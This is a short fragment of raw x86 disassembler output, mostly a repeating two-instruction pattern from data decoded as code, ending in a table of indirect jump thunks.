  424522:	add    BYTE PTR [eax],al
  424524:	ds pop ebx
  424526:	add    BYTE PTR [eax],al
  424528:	ds pop ebx
  42452a:	add    BYTE PTR [eax],al
  42452c:	ds pop ebx
  42452e:	add    BYTE PTR [eax],al
  424530:	ds pop ebx
  424532:	add    BYTE PTR [eax],al
  424534:	ds pop ebx
  424536:	add    BYTE PTR [eax],al
  424538:	ds pop ebx
  42453a:	add    BYTE PTR [eax],al
  42453c:	ds pop ebx
  42453e:	add    BYTE PTR [eax],al
  424540:	ds pop ebx
  424542:	add    BYTE PTR [eax],al
  424544:	ds pop ebx
  424546:	add    BYTE PTR [eax],al
  424548:	ds pop ebx
  42454a:	add    BYTE PTR [eax],al
  42454c:	ds pop ebx
  42454e:	add    BYTE PTR [eax],al
  424550:	ds pop ebx
  424552:	add    BYTE PTR [eax],al
  424554:	ds pop ebx
	...
  424582:	ds pop ebx
  424584:	add    BYTE PTR [eax],al
  424586:	ds pop ebx
  424588:	add    BYTE PTR [eax],al
  42458a:	ds pop ebx
  42458c:	add    BYTE PTR [eax],al
  42458e:	ds pop ebx
  424590:	add    BYTE PTR [eax],al
  424592:	ds pop ebx
  424594:	add    BYTE PTR [eax],al
  424596:	ds pop ebx
  424598:	add    BYTE PTR [eax],al
  42459a:	ds pop ebx
  42459c:	add    BYTE PTR [eax],al
  42459e:	ds pop ebx
  4245a0:	add    BYTE PTR [eax],al
  4245a2:	ds pop ebx
  4245a4:	add    BYTE PTR [eax],al
  4245a6:	ds pop ebx
  4245a8:	add    BYTE PTR [eax],al
  4245aa:	ds pop ebx
  4245ac:	add    BYTE PTR [eax],al
  4245ae:	ds pop ebx
  4245b0:	add    BYTE PTR [eax],al
  4245b2:	ds pop ebx
  4245b4:	add    BYTE PTR [eax],al
  4245b6:	ds pop ebx
  4245b8:	add    BYTE PTR [eax],al
  4245ba:	ds pop ebx
  4245bc:	add    BYTE PTR [eax],al
  4245be:	ds pop ebx
  4245c0:	add    BYTE PTR [eax],al
  4245c2:	ds pop ebx
  4245c4:	add    BYTE PTR [eax],al
  4245c6:	ds pop ebx
  4245c8:	add    BYTE PTR [eax],al
  4245ca:	ds pop ebx
  4245cc:	add    BYTE PTR [eax],al
  4245ce:	ds pop ebx
  4245d0:	add    BYTE PTR [eax],al
  4245d2:	ds pop ebx
  4245d4:	add    BYTE PTR [eax],al
  4245d6:	ds pop ebx
  4245d8:	add    BYTE PTR [eax],al
  4245da:	ds pop ebx
  4245dc:	add    BYTE PTR [eax],al
  4245de:	ds pop ebx
  4245e0:	add    BYTE PTR [eax],al
  4245e2:	ds pop ebx
	...
  424610:	ds pop ebx
  424612:	add    BYTE PTR [eax],al
  424614:	ds pop ebx
  424616:	add    BYTE PTR [eax],al
  424618:	ds pop ebx
  42461a:	add    BYTE PTR [eax],al
  42461c:	ds pop ebx
  42461e:	add    BYTE PTR [eax],al
  424620:	ds pop ebx
  424622:	add    BYTE PTR [eax],al
  424624:	ds pop ebx
  424626:	add    BYTE PTR [eax],al
  424628:	ds pop ebx
  42462a:	add    BYTE PTR [eax],al
  42462c:	ds pop ebx
  42462e:	add    BYTE PTR [eax],al
  424630:	ds pop ebx
  424632:	add    BYTE PTR [eax],al
  424634:	ds pop ebx
  424636:	add    BYTE PTR [eax],al
  424638:	ds pop ebx
  42463a:	add    BYTE PTR [eax],al
  42463c:	ds pop ebx
  42463e:	add    BYTE PTR [eax],al
  424640:	ds pop ebx
  424642:	add    BYTE PTR [eax],al
  424644:	ds pop ebx
  424646:	add    BYTE PTR [eax],al
  424648:	ds pop ebx
  42464a:	add    BYTE PTR [eax],al
  42464c:	ds pop ebx
  42464e:	add    BYTE PTR [eax],al
  424650:	ds pop ebx
  424652:	add    BYTE PTR [eax],al
  424654:	ds pop ebx
  424656:	add    BYTE PTR [eax],al
  424658:	ds pop ebx
  42465a:	add    BYTE PTR [eax],al
  42465c:	ds pop ebx
  42465e:	add    BYTE PTR [eax],al
  424660:	ds pop ebx
  424662:	add    BYTE PTR [eax],al
  424664:	ds pop ebx
  424666:	add    BYTE PTR [eax],al
  424668:	ds pop ebx
  42466a:	add    BYTE PTR [eax],al
  42466c:	ds pop ebx
  42466e:	add    BYTE PTR [eax],al
  424670:	ds pop ebx
	...
  42469e:	jmp    DWORD PTR ds:0x42ed9c
  4246a4:	jmp    DWORD PTR ds:0x42eda0
  4246aa:	jmp    DWORD PTR ds:0x42eda4
  4246b0:	jmp    DWORD PTR ds:0x42eda8
  4246b6:	jmp    DWORD PTR ds:0x42edac
  4246bc:	jmp    DWORD PTR ds:0x42edb0
  4246c2:	jmp    DWORD PTR ds:0x42edb4
  4246c8:	jmp    DWORD PTR ds:0x42edbc
  4246ce:	jmp    DWORD PTR ds:0x42edc4
  4246d4:	jmp    DWORD PTR ds:0x42edc8
